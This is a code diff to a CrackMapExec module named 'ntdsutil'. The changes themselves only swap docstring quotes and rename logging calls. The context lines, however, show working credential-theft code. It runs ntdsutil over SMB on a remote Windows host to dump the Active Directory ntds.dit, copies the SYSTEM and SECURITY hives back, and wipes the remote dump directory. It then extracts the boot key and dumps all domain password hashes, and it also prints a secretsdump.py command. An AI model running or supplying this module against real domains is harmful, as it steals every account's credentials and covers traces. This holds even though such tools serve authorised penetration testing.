@@ -9,11 +9,11 @@ from cme.helpers.logger import highlight
 from cme.helpers.misc import validate_ntlm
 
 class CMEModule:
-    '''
+    """
         Dump NTDS with ntdsutil
         Module by @zblurx
 
-    '''
+    """
     name = 'ntdsutil'
     description = 'Dump NTDS with ntdsutil'
     supported_protocols = ['smb']
@@ -21,12 +21,12 @@ class CMEModule:
     multiple_hosts = False
 
     def options(self, context, module_options):
-        '''
+        """
         Dump NTDS with ntdsutil
         Module by @zblurx
 
         DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing
-        '''
+        """
         self.share = "ADMIN$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
@@ -40,7 +40,7 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         command = "powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full %s%s' q q\"" % (self.tmp_dir, self.dump_location)
-        context.log.info('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
+        context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir,self.dump_location))
         context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')
         context.log.debug('Executing command {}'.format(command))
         p = connection.execute(command, True)
@@ -48,21 +48,21 @@ class CMEModule:
         if 'success' in p:
             context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
         else:
-            context.log.error("Error while dumping NTDS")
+            context.log.fail("Error while dumping NTDS")
             return
 
         os.makedirs(self.dir_result, exist_ok=True)
         os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)
         os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)
 
-        context.log.info("Copying NTDS dump to %s" % self.dir_result)
+        context.log.display("Copying NTDS dump to %s" % self.dir_result)
         context.log.debug('Copy ntds.dit to host')
         with open(os.path.join(self.dir_result,'Active Directory','ntds.dit'), 'wb+') as dump_file:
             try:
                 connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'Active Directory\\ntds.dit', dump_file.write)
                 context.log.debug('Copied ntds.dit file')
             except Exception as e:
-                context.log.error('Error while get ntds.dit file: {}'.format(e))
+                context.log.fail('Error while get ntds.dit file: {}'.format(e))
 
         context.log.debug('Copy SYSTEM to host')
         with open(os.path.join(self.dir_result,'registry','SYSTEM'), 'wb+') as dump_file:
@@ -70,7 +70,7 @@ class CMEModule:
                 connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'registry\\SYSTEM', dump_file.write)
                 context.log.debug('Copied SYSTEM file')
             except Exception as e:
-                context.log.error('Error while get SYSTEM file: {}'.format(e))
+                context.log.fail('Error while get SYSTEM file: {}'.format(e))
 
         context.log.debug('Copy SECURITY to host')
         with open(os.path.join(self.dir_result,'registry','SECURITY'), 'wb+') as dump_file:
@@ -78,14 +78,14 @@ class CMEModule:
                 connection.conn.getFile(self.share, self.tmp_share + self.dump_location + "\\" + 'registry\\SECURITY', dump_file.write)
                 context.log.debug('Copied SECURITY file')
             except Exception as e:
-                context.log.error('Error while get SECURITY file: {}'.format(e))
-        context.log.info("NTDS dump copied to %s" % self.dir_result)
+                context.log.fail('Error while get SECURITY file: {}'.format(e))
+        context.log.display("NTDS dump copied to %s" % self.dir_result)
         try:
             command = "rmdir /s /q %s%s" % (self.tmp_dir, self.dump_location)
             p = connection.execute(command, True)
             context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))
         except Exception as e:
-            context.log.error('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))
+            context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))
 
         localOperations = LocalOperations("%s/registry/SYSTEM" % self.dir_result)
         bootKey = localOperations.getBootKey()
@@ -134,15 +134,15 @@ class CMEModule:
             context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')
             NTDS.dump()
             context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))
-            context.log.info("To extract only enabled accounts from the output file, run the following command: ")
-            context.log.info("grep -iv disabled {} | cut -d ':' -f1".format(connection.output_filename + '.ntds'))
+            context.log.display("To extract only enabled accounts from the output file, run the following command: ")
+            context.log.display("grep -iv disabled {} | cut -d ':' -f1".format(connection.output_filename + '.ntds'))
         except Exception as e:
-            context.log.error(e)
+            context.log.fail(e)
 
         NTDS.finish()
         
         if self.no_delete:
-           context.log.info('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)
-           context.log.info("secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL" % (self.dir_result, self.dir_result, self.dir_result))
+           context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)
+           context.log.display("secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL" % (self.dir_result, self.dir_result, self.dir_result))
         else:
             shutil.rmtree(self.dir_result)
